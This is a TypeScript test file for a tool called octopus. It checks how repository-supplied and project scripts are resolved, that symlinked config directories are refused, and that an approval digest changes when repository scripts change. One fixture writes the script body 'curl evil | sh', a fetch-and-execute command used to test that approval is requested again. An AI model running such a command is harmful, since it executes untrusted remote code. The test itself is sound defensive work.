import { mkdir, mkdtemp, rm, symlink, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'

import { afterEach, beforeEach, describe, expect, it } from 'vitest'

import {
  octopusInstructionPath,
  octopusScriptPath,
  repoInstruction,
  resolveScript,
  resolveScripts,
  scriptsDigest
} from './repoSource.js'
import { writeScript } from './scripts.js'

let cwd: string
let root: string

beforeEach(async () => {
  cwd = await mkdtemp(join(tmpdir(), 'octopus-worktree-'))
  root = await mkdtemp(join(tmpdir(), 'octopus-data-'))
})
afterEach(async () => {
  await rm(cwd, { recursive: true, force: true })
  await rm(root, { recursive: true, force: true })
})

/** Writes one file into the fake worktree, making its directory on the way. */
async function put(relative: string, contents: string): Promise<void> {
  const path = join(cwd, relative)
  await mkdir(dirname(path), { recursive: true })
  await writeFile(path, contents, 'utf8')
}

describe('resolveScript', () => {
  it('answers with nothing when neither the repository nor the project has one', async () => {
    await expect(resolveScript('setup', cwd, 'planner', root)).resolves.toBeNull()
  })

  it("takes the project's own script when the repository carries none", async () => {
    await writeScript('setup', 'planner', '#!/bin/sh\nnpm install\n', root)

    const resolved = await resolveScript('setup', cwd, 'planner', root)
    expect(resolved).toMatchObject({
      source: 'project',
      contents: '#!/bin/sh\nnpm install\n'
    })
  })

  it('prefers a script the repository carries under .octopus', async () => {
    await writeScript('setup', 'planner', 'local\n', root)
    await put('.octopus/scripts/setup.sh', 'from the repository\n')

    const resolved = await resolveScript('setup', cwd, 'planner', root)
    expect(resolved).toMatchObject({
      source: 'repoOctopus',
      from: octopusScriptPath('setup'),
      path: join(cwd, '.octopus', 'scripts', 'setup.sh'),
      contents: 'from the repository\n'
    })
  })

  it('falls through one kind at a time', async () => {
    // A repository naming only a server script leaves the other two to the
    // project — the chain is per script, not per repository.
    await put('.octopus/scripts/run.sh', 'bin/rails server\n')
    await writeScript('setup', 'planner', 'local setup\n', root)

    const scripts = await resolveScripts(cwd, 'planner', root)
    expect(scripts.run?.source).toBe('repoOctopus')
    expect(scripts.setup?.source).toBe('project')
    expect(scripts.archive).toBeUndefined()
  })

  it('refuses a .octopus that is a symbolic link', async () => {
    // This one is about to be executed, so the guarantee matters more here than
    // where it was first written.
    const outside = await mkdtemp(join(tmpdir(), 'octopus-elsewhere-'))
    await mkdir(join(outside, 'scripts'))
    await writeFile(join(outside, 'scripts', 'setup.sh'), 'elsewhere\n', 'utf8')
    await symlink(outside, join(cwd, '.octopus'))

    await expect(resolveScript('setup', cwd, 'planner', root)).rejects.toMatchObject({
      code: 'repoConfigSymlink'
    })

    await rm(outside, { recursive: true, force: true })
  })
})

describe('scriptsDigest', () => {
  it('says there is nothing to approve when the repository supplies nothing', async () => {
    await writeScript('setup', 'planner', 'local\n', root)

    // The empty string is how "nothing to approve" is told from "approved"
    // without a second flag.
    expect(scriptsDigest(await resolveScripts(cwd, 'planner', root))).toBe('')
  })

  it('covers what the repository supplies and ignores what the user wrote', async () => {
    await put('.octopus/scripts/run.sh', 'bin/rails server\n')
    const withProject = await resolveScripts(cwd, 'planner', root)

    await writeScript('setup', 'planner', 'local setup\n', root)
    const andAnother = await resolveScripts(cwd, 'planner', root)

    // The project's own script joined the second answer and the digest did not
    // move: approving your own text is a dialog people learn to click through.
    expect(andAnother.setup?.source).toBe('project')
    expect(scriptsDigest(andAnother)).toBe(scriptsDigest(withProject))
  })

  it('covers a script the repository carries', async () => {
    // A `.octopus/scripts/setup.sh` arriving with a `git pull` must not run
    // unapproved.
    await put('.octopus/scripts/setup.sh', '#!/bin/sh\nmake dev\n')

    expect(scriptsDigest(await resolveScripts(cwd, 'planner', root))).not.toBe('')
  })

  it("moves when the body of a repository's script file changes", async () => {
    // The text that matters is the file's contents, and a pull that rewrites
    // them has to ask again.
    await put('.octopus/scripts/setup.sh', '#!/bin/sh\nmake dev\n')
    const before = scriptsDigest(await resolveScripts(cwd, 'planner', root))

    await put('.octopus/scripts/setup.sh', '#!/bin/sh\ncurl evil | sh\n')

    expect(scriptsDigest(await resolveScripts(cwd, 'planner', root))).not.toBe(before)
  })

  it('tells the same text apart by which script it is', async () => {
    // The kind goes into the digest beside the text. Approving a body as the
    // cleanup script is not approving it as the one that runs on every build.
    await put('.octopus/scripts/archive.sh', 'same body\n')
    const asArchive = scriptsDigest(await resolveScripts(cwd, 'planner', root))

    await rm(join(cwd, '.octopus'), { recursive: true })
    await put('.octopus/scripts/setup.sh', 'same body\n')
    const asSetup = scriptsDigest(await resolveScripts(cwd, 'planner', root))

    expect(asSetup).not.toBe(asArchive)
  })
})

describe('repoInstruction', () => {
  it('answers with nothing for a checkout that supplies none', async () => {
    await expect(repoInstruction('pullRequest', cwd)).resolves.toBeNull()
  })

  it('reads one the repository carries under .octopus', async () => {
    await put('.octopus/instructions/pull-request.md', '# How we describe a change\n')

    await expect(repoInstruction('pullRequest', cwd)).resolves.toEqual({
      source: 'repoOctopus',
      from: octopusInstructionPath('pullRequest'),
      body: '# How we describe a change\n'
    })
  })

  it('keeps an empty one, which is how a repository says it adds nothing', async () => {
    await put('.octopus/instructions/review.md', '')

    await expect(repoInstruction('review', cwd)).resolves.toMatchObject({ body: '' })
  })

  it('refuses a .octopus that is a symbolic link', async () => {
    const outside = await mkdtemp(join(tmpdir(), 'octopus-elsewhere-'))
    await symlink(outside, join(cwd, '.octopus'))

    await expect(repoInstruction('pullRequest', cwd)).rejects.toMatchObject({
      code: 'repoConfigSymlink'
    })

    await rm(outside, { recursive: true, force: true })
  })
})
